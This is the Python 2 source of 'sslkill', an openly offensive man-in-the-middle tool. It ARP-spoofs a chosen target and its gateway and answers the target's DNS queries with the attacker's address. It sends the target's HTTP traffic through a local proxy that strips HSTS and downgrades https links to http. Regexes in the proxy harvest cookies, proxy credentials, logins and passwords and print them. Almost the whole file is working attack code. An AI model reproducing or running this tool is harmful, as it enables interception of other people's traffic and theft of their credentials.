#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program sslkill
#
# sslkill is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

version = 1.0
banner = """\n

  ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
▒██    ▒ ▒██    ▒ ▓██▒        ██▄█▒ ▓██▒▓██▒    ▓██▒
░ ▓██▄   ░ ▓██▄   ▒██░       ▓███▄░ ▒██▒▒██░    ▒██░
  ▒   ██▒  ▒   ██▒▒██░       ▓██ █▄ ░██░▒██░    ▒██░
▒██████▒▒▒██████▒▒░██████▒   ▒██▒ █▄░██░░██████▒░██████▒
▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒░▓  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░░ ░▒  ░ ░░ ░ ▒  ░   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░  ░  ░  ░    ░ ░      ░ ░░ ░  ▒ ░  ░ ░     ░ ░
      ░        ░      ░  ░   ░  ░    ░      ░  ░    ░  ░

		      SSL Kill v{}

by: m4n3dw0lf""".format(version)

help = """\nusage:
 Network interface:     -i <INTERFACE> or --interface <INTERFACE>
 Target IP Address:     -t <TARGET> or --target <TARGET>
 Gateway IP Address:    -g <GATEWAY> or --gateway <GATEWAY> 
 Debugg mode:           -d Turn debugger ON, default = OFF

example:
  $sudo ./sslkill.py -i wlan0 -t 10.0.0.3 -g 10.0.0.1
\n""".format(version)


import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import sys
import threading
import fcntl
import struct
import ssl
import urllib2
import re
import socket
import select
import httplib
import urlparse
import threading
import gzip
import zlib
import time
import json
from time import sleep
from scapy.all import *
from netfilterqueue import NetfilterQueue
from collections import deque
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from cStringIO import StringIO
from subprocess import Popen, PIPE
from HTMLParser import HTMLParser

debug = False

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    address_family = socket.AF_INET6
    daemon_threads = True

    def handle_error(self, request, client_address):
        # surpress socket/ssl related errors
        cls, e = sys.exc_info()[:2]
        if cls is socket.error or cls is ssl.SSLError:
            pass
        else:
            return HTTPServer.handle_error(self, request, client_address)

class ProxyRequestHandler(BaseHTTPRequestHandler):
    timeout = 5
    lock = threading.Lock()

    def __init__(self, *args, **kwargs):
        self.tls = threading.local()
        self.tls.conns = {}
        BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

    def log_error(self, format, *args):
        # surpress "Request timed out: timeout('timed out',)"
        if isinstance(args[0], socket.timeout):
            return

        self.log_message(format, *args)

    def do_CONNECT(self):
    	self.connect_relay()

    def connect_relay(self):
        address = self.path.split(':', 1)
        address[1] = int(address[1]) or 443
        try:
            s = socket.create_connection(address, timeout=self.timeout)
        except Exception as e:
            self.send_error(502)
            return
        self.send_response(200, 'Connection Established')
        self.end_headers()

        conns = [self.connection, s]
        self.close_connection = 0
        while not self.close_connection:
            rlist, wlist, xlist = select.select(conns, [], conns, self.timeout)
            if xlist or not rlist:
                break
            for r in rlist:
                other = conns[1] if r is conns[0] else conns[0]
                data = r.recv(8192)
                if not data:
                    self.close_connection = 1
                    break
                other.sendall(data)

    def do_GET(self):
        req = self
        content_length = int(req.headers.get('Content-Length', 0))
        req_body = self.rfile.read(content_length) if content_length else None
        if req.path[0] == '/':
            if isinstance(self.connection, ssl.SSLSocket):
                req.path = "https://%s%s" % (req.headers['Host'], req.path)
            else:
                req.path = "http://%s%s" % (req.headers['Host'], req.path)
        req_body_modified = self.request_handler(req, req_body)
        if req_body_modified is False:
            self.send_error(403)
            return
        elif req_body_modified is not None:
            req_body = req_body_modified
            req.headers['Content-length'] = str(len(req_body))
        u = urlparse.urlsplit(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)
        assert scheme in ('http', 'https')
        if netloc:
	    prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis","wb","ws","wbr","wna","wads","wlogin","wwm","wm","wmobile","wsb"]
            req.headers['Host'] = netloc
	    for prefix in prefixes:
	    	if netloc.startswith(prefix):
			netloc = netloc[1:]
			scheme = "https"
        setattr(req, 'headers', self.filter_headers(req.headers))
        try:
       	 	origin = (scheme, netloc)
		if debug:
			print "[+] Connection: {}://{}".format(scheme, netloc)
	        if not origin in self.tls.conns:
	        	if scheme == 'https':
	                	self.tls.conns[origin] = httplib.HTTPSConnection(netloc, timeout=self.timeout)
	                else:
	                    	self.tls.conns[origin] = httplib.HTTPConnection(netloc, timeout=self.timeout)
	        conn = self.tls.conns[origin]
	        conn.request(self.command, path, req_body, dict(req.headers))
		if debug:
			print "[+] Command: {}".format(self.command)
			print "[+] Path: {}".format(path)
			print "----------------------------------------------------------------------"
	        res = conn.getresponse()
	        version_table = {10: 'HTTP/1.0', 11: 'HTTP/1.1'}
	        setattr(res, 'headers', res.msg)
	        setattr(res, 'response_version', version_table[res.version])

            # support streaming
		try:
        		if not 'Content-Length' in res.headers and 'no-store' in res.headers.get('Cache-Control'):
        			self.response_handler(req, req_body, res, '')
        			setattr(res, 'headers', self.filter_headers(res.headers))
        			self.relay_streaming(res)
        			return

		except TypeError:
			pass

        	res_body = res.read()
        except Exception as e:
	    if debug:
	    	print "Exception !!! ---- > : {}".format(e)
            if origin in self.tls.conns:
                del self.tls.conns[origin]
            self.send_error(502)
            return

        content_encoding = res.headers.get('Content-Encoding', 'identity')
        res_body_plain = self.decode_content_body(res_body, content_encoding)
	res_body_modified = self.response_handler(req, req_body, res, res_body_plain, scheme, netloc, path, self.command)
        if res_body_modified is False:
            self.send_error(403)
            return
        elif res_body_modified is not None:
            res_body_plain = res_body_modified
            res_body = self.encode_content_body(res_body_plain, content_encoding)
            res.headers['Content-Length'] = str(len(res_body))
        setattr(res, 'headers', self.filter_headers(res.headers))

        self.wfile.write("%s %d %s\r\n" % (self.protocol_version, res.status, res.reason))
        for line in res.headers.headers:
            self.wfile.write(line)
        self.end_headers()
        self.wfile.write(res_body)
       	self.wfile.flush()


    def relay_streaming(self, res):
        self.wfile.write("%s %d %s\r\n" % (self.protocol_version, res.status, res.reason))
        for line in res.headers.headers:
            self.wfile.write(line)
        self.end_headers()
        try:
            while True:
                chunk = res.read(8192)
                if not chunk:
                    break
                self.wfile.write(chunk)
            self.wfile.flush()
        except socket.error:
            # connection closed by client
            pass

    do_HEAD = do_GET
    do_POST = do_GET
    do_OPTIONS = do_GET

    def filter_headers(self, headers):
        # http://tools.ietf.org/html/rfc2616#section-13.5.1
        hop_by_hop = ('connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'transfer-encoding', 'upgrade')
        for k in hop_by_hop:
            del headers[k]

        # accept only supported encodings
        if 'Accept-Encoding' in headers:
            ae = headers['Accept-Encoding']
            filtered_encodings = [x for x in re.split(r',\s*', ae) if x in ('identity', 'gzip', 'x-gzip', 'deflate')]
            headers['Accept-Encoding'] = ', '.join(filtered_encodings)

        return headers

    def encode_content_body(self, text, encoding):
        if encoding == 'identity':
            data = text
        elif encoding in ('gzip', 'x-gzip'):
            io = StringIO()
            with gzip.GzipFile(fileobj=io, mode='wb') as f:
                f.write(text)
            data = io.getvalue()
        elif encoding == 'deflate':
            data = zlib.compress(text)
        else:
            raise Exception("Unknown Content-Encoding: %s" % encoding)
        return data

    def decode_content_body(self, data, encoding):
        if encoding == 'identity':
            text = data
        elif encoding in ('gzip', 'x-gzip'):
            io = StringIO(data)
            with gzip.GzipFile(fileobj=io) as f:
                text = f.read()
        elif encoding == 'deflate':
            try:
                text = zlib.decompress(data)
            except zlib.error:
                text = zlib.decompress(data, -zlib.MAX_WBITS)
        else:
            raise Exception("Unknown Content-Encoding: %s" % encoding)
        return text

    def request_handler(self, req, req_body):
        pass

    def response_handler(self, req, req_body, res, res_body, scheme, netloc, path, method):
        pass


def Proxy(HandlerClass=ProxyRequestHandler, ServerClass=ThreadingHTTPServer, protocol="HTTP/1.1"):
    port = 8080
    server_address = ('', port)

    HandlerClass.protocol_version = protocol
    httpd = ServerClass(server_address, HandlerClass)

    sa = httpd.socket.getsockname()
    print "\n[+] Serving HTTP Proxy on", sa[0], "port", sa[1], "..."
    httpd.serve_forever()


class SSLStripRequestHandler(ProxyRequestHandler):
    replaced_urls = deque(maxlen=1024)
    def request_handler(self, req, req_body):
	if debug:
		print "\n-----------------------------[Request]--------------------------------"
	if req.headers:
		modified = False
		if debug:
			print "[+] Original Headers:"
			print req.headers
		prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis","wb","ws","wbr","wna","wads","wlogin","wmm","wm","wmobile","wsb"]
                pxy_regex = '([Ww]ww-[Aa]uthorization:|[Ww]ww-[Aa]uthentication:|[Pp]roxy-[Aa]uthorization:|[Pp]roxy-[Aa]uthentication:) Basic (.*?) '
		cookie_regex = '([Cc]okie:)(.*?)'
		for p in prefixes:
			for h in req.headers:
				if p in req.headers[h]:
					req.headers[h] = req.headers[h].replace(p, p[1:])
					modified = True
		for h in req.headers:
			proxy = re.findall(pxy_regex, h)
			cookie = re.findall(cookie_regex, h)
		if cookie:
			print "\n[$$$] Cookie found: " + str(cookie[0][1]) + "\n"
		if proxy:
			try:
           			print "\n[$$$] Proxy credentials: " + str(proxy[0][1]).decode('base64') + "\n"
                	except:
                	        print "\n[$$$] Proxy credentials: " + str(proxy[0][1]) + "\n"
		if debug:
			if modified:
				print "[+] Modified Headers:"
				print req.headers
	if req_body:
		modified = False
		if debug:
			print "\n[+]Original Body:"
			print req_body
		for p in prefixes:
			if p in req_body:
				req_body.replace(p, p[1:])
				modified = True
		if debug:
			if modified:
				print "[+] Modified Body:"
				print req_body
		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Ll]ogin|[Ll]ogin[Ii][Dd]|[Uu]name|[Uu]suario)=([^&|;]*)'
                pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
		plain_text = str(req_body.replace("\n"," "))
		users = re.findall(user_regex, plain_text)
                passwords = re.findall(pw_regex, plain_text)
                if users:
                        print "\n[$$$] Login found: " + str(users[0][1]) + "\n"
                if passwords:
                        print "\n[$$$] Password found: " + str(passwords[0][1]) + "\n"


    def response_handler(self, req, req_body, res, res_body, scheme, netloc, path, method):
	if debug:
		print "\n----------------------------[Response]--------------------------------"
	if res.headers:
		modified = False
		#Protection HSTS Header to Strip
		hsts = 'Strict-Transport-Security'
		if debug:
			print "\n[+] Original Headers:"
			print res.headers
			print
		for h in res.headers:
			if "https://" in res.headers[h]:
				res.headers[h].replace("https://","http://w")
				modified = True
		try:
			if res.headers[hsts]:
				del res.headers[hsts]
				modified = True
		except:
			pass
		try:
			res.headers['Location'] = res.headers['Location'].replace("https://","http://w")
			replaced_urls.append(res.headers['Location'])
			modified = True
		except:
			pass
		if debug:
			if modified:
				print "\n[+] Modified Headers:"
				print res.headers
				print
	if res_body:
		if debug:
			print "\n[+] Original Body:"
			print res_body
		if scheme == "http":
			return res_body
		else:
			try:
				hds = {}
				hds['User-Agent'] = req.headers['User-Agent']
				if method == "POST":
					original_request = urllib2.Request("{}://{}{}".format(scheme, netloc, path), data=req_body, headers=hds)
					original_body = urllib2.urlopen(original_request).read()
					res_body = original_body.replace("https://", "http://w")
				else:
					original_request = urllib2.Request("{}://{}{}".format(scheme, netloc, path),headers=hds)
					original_body = urllib2.urlopen(original_request).read()
					res_body = original_body.replace("https://","http://w")
			except Exception as e:
				print "Exception caught: {}".format(e)
				res_body = res_body.replace("https://","http://w")
		if debug:
			print "\n[+] Modified Body:"
			print res_body.replace("https://","http://w")
		return res_body
	if debug:
		print "\n----------------------------------------------------------------------"


class SSLKiller(object):

	def __init__(self, interface, target, gateway):
		print banner
		print
		self.interface = interface
		print "[+] Interface: {}".format(self.interface)
		def nic_ip(interface):
			try:
		        	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		        	return socket.inet_ntoa(fcntl.ioctl(
		        	        s.fileno(),
        			        0x8915,
        			        struct.pack('256s', interface[:15])
		        	)[20:24])
			except IOError:
				print "[!] Select a valid network interface, exiting ..."
				exit(0)

		def nic_mac(interface):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        		info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
        		return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
		self.hostIP = nic_ip(self.interface)
		print "[+] This host IP Address: {}".format(self.hostIP)
		self.hostMAC = nic_mac(self.interface)
		print "[+] This host MAC Address: {}".format(self.hostMAC)
		def resolve_mac(ip):
			try:
				conf.verb = 0
				ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=ip), timeout=2)
				for snd, rcv in ans:
					return str(rcv[Ether].src)
			except socket.gaierror:
				print "[!] Select a valid IP Address as target/gateway, exiting ..."
				exit(0)
		self.targetIP = target
		print "[+] Target IP Address: {}".format(self.targetIP)
		self.targetMAC = resolve_mac(self.targetIP)
		print "[+] Target MAC Address: {}".format(self.targetMAC)
		self.gatewayIP = gateway
		print "[+] Gateway IP Address: {}".format(self.gatewayIP)
		self.gatewayMAC = resolve_mac(self.gatewayIP)
		print "[+] Gateway MAC Address: {}".format(self.gatewayMAC)
		if not self.targetMAC or not self.gatewayMAC:
			print "[!] Failed to resolve MAC Address, check if IP Address is online, exiting ..."
			exit(0)
		animation = "|/-\\"
		for i in range(15):
		    time.sleep(0.1)
		    sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + " Loading SSL Kill ...")
	    	    sys.stdout.flush()
		self.ArpPoisoner()
		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
		self.DnsPoisoner()
		print "\n[+] DNS Poisoner thread loaded"
		if debug:
			print "\n[+]Debugger is on!"
		else:
			print "\n[-]Debugger is off!"

	def ArpPoisoner(self):
		#ARP Spoof both ways, target and gateway
		def ArpThread():
			t = threading.Thread(name='ARPspoof', target=ArpPoison)
			t.setDaemon(True)
			t.start()
		def ArpPoison():
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
			socket_L2 = conf.L2socket(iface=self.interface)
			while True:
				sleep(3)
				socket_L2.send(Ether(src=self.hostMAC, dst=self.targetMAC)/ARP(hwsrc=self.hostMAC, psrc=self.gatewayIP, op="is-at"))
				socket_L2.send(Ether(src=self.hostMAC, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.hostMAC, psrc=self.targetIP, op="is-at"))
		ArpThread()
		#ArpPoison()

	def DnsPoisoner(self):
		def callback(packet):
			payload = packet.get_payload()
			pkt = IP(payload)
			if not pkt.haslayer(DNSQR):
				packet.accept()
			else:
				if debug:
					print "[+]DNS Poisoning {} --> {}".format(pkt[DNS].qd.qname, self.hostIP)
	                	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        	                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
        	                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
        	                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
        	                packet.set_payload(str(new_pkt))
				packet.accept()

		def DnsThread():
			t = threading.Thread(name='DNSspoof', target=DnsPoison)
			t.setDaemon(True)
			t.start()
		def DnsPoison():
			os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
			q = NetfilterQueue()
			q.bind(1, callback)
			q.run()
		DnsThread()
		#DnsPoison()


if __name__ == "__main__":

	if os.geteuid() != 0:
        	sys.exit("[-] Only for roots kido! ")
	try:
		for x in sys.argv:
			if x == "-h" or x == "--help":
				print banner
				print help
				exit(0)
			if x == "-d" or x == "--debugger":
				debug = True
			if x == "-i" or x == "--interface":
				index = sys.argv.index(x) + 1
				interface = sys.argv[index]
			if x == "-t" or x == "--target":
				index = sys.argv.index(x) + 1
				target = sys.argv[index]
			if x == "-g" or x == "--gateway":
				index = sys.argv.index(x) + 1
				gateway = sys.argv[index]
		sslkill = SSLKiller(interface, target, gateway)
		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
		Proxy(HandlerClass=SSLStripRequestHandler)
	except KeyboardInterrupt:
		print "[!] Aborted..."
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		os.system('iptables -t nat -F')
		exit(0)
	except Exception as e:
		print banner
		print help
		print "[!] Exception caught: {}".format(e)
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		os.system('iptables -t nat -F')
		exit(0)
